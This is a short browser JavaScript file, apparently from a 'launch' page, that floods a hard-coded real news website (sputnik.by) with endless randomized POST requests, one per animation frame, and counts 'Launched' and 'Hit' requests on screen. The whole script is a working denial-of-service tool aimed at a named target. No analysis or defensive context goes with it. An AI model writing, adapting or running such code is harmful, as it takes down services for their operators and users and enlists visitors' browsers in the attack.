(function () {
  var elements = {
    btn: document.getElementById('btnAction'),
    counter: document.getElementById('txtCounter') 
  }

  var targets = [{
    host: 'sputnik.by',
    port: '443',
    path: '/',
  }];

  var counter = {
    total: 0,
    hit: 0,
  }

  function refreshCounter() {
    elements.counter.innerHTML = `Launched: <strong>${counter.total}</strong>, Hit: <strong>${counter.hit}</strong>`;
  }

  window.launchCannon = function () {
    var target = targets[Math.floor(Math.random() * targets.length)];
    var rand = Math.floor(Math.random() * 1000000) + new Date().getTime();
    counter.total++;
    refreshCounter()
    fetch(`https://${target.host}:${target.port}${target.path}/${rand}`, {
      method: 'POST',
      mode: 'no-cors',
    }).finally(function() {
      counter.hit++;
      refreshCounter()
    })
    requestAnimationFrame(window.launchCannon)
  }
})();
